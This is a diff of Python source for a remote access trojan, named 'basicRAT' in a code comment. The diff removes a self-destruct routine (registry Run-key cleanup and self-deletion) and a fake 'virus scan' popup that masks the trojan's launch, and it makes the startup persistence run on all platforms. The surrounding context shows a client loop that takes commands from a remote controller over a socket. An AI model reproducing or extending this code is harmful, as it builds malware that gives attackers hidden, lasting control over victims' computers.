@@ -21,6 +21,7 @@ import json
 import traceback
 
 # determine system platform
+PLAT = "unknown"
 if sys.platform.startswith('win'):
     PLAT = 'win'
 elif sys.platform.startswith('linux'):
@@ -74,9 +75,8 @@ def windows_persistence():
             else:
                 return False, 'startup file add failed'
 
-    except WindowsError:
+    except:
         return False, 'startup file add failed'
-
 
 def linux_persistence():
     return False, 'nothing here yet'
@@ -259,32 +259,6 @@ def ls(path):
 def pwd():
     return os.getcwd()
 
-
-def selfdestruct(plat):
-    if plat == 'win':
-        import _winreg
-        from _winreg import HKEY_CURRENT_USER as HKCU
-
-        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
-        try:
-            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
-            _winreg.DeleteValue(reg_key, 'br')
-            _winreg.CloseKey(reg_key)
-        except WindowsError:
-            pass
-
-    elif plat == 'nix':
-        pass
-
-    elif plat == 'mac':
-        pass
-
-    # self delete basicRAT
-    os.remove(sys.argv[0])
-    sys.exit(0)
-
-
 def unzip(f):
     if os.path.isfile(f):
         try:
@@ -344,11 +318,6 @@ def client_loop(conn):
         if cmd == 'kill':
             conn.close()
             return 1
-
-        elif cmd == 'selfdestruct':
-            conn.close()
-            selfdestruct(PLAT)
-
         elif cmd == 'quit':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
@@ -390,10 +359,7 @@ def client_loop(conn):
 
 def main():
     exit_status = 0
-
-
-    if sys.platform.startswith('win'):
-        persistence(PLAT)
+    persistence(PLAT)
 
     while True:
         conn = socket.socket()
@@ -418,29 +384,4 @@ def main():
 
 
 if __name__ == '__main__':
-
-    if PLAT == "win":
-
-        import win32api, win32con
-        import win32ui
-
-        def winpop():
-            def btnClose():
-                time.sleep(20)
-                try:
-                    hd = win32ui.FindWindow(None, "scan")
-                    hd.SendMessage(win32con.WM_CLOSE)
-                except:
-                    pass
-                win32api.MessageBox(0, "The scan is complete, no virus was not found",  "scan", win32con.MB_OK)
-
-            thread = threading.Thread(target=btnClose)
-            thread.start()
-
-            win32api.MessageBox(0, u"Background scanning...", "scan", win32con.MB_OK)
-
-            thread.join()
-
-        threading.Thread(target=winpop).start()
-    
     main()
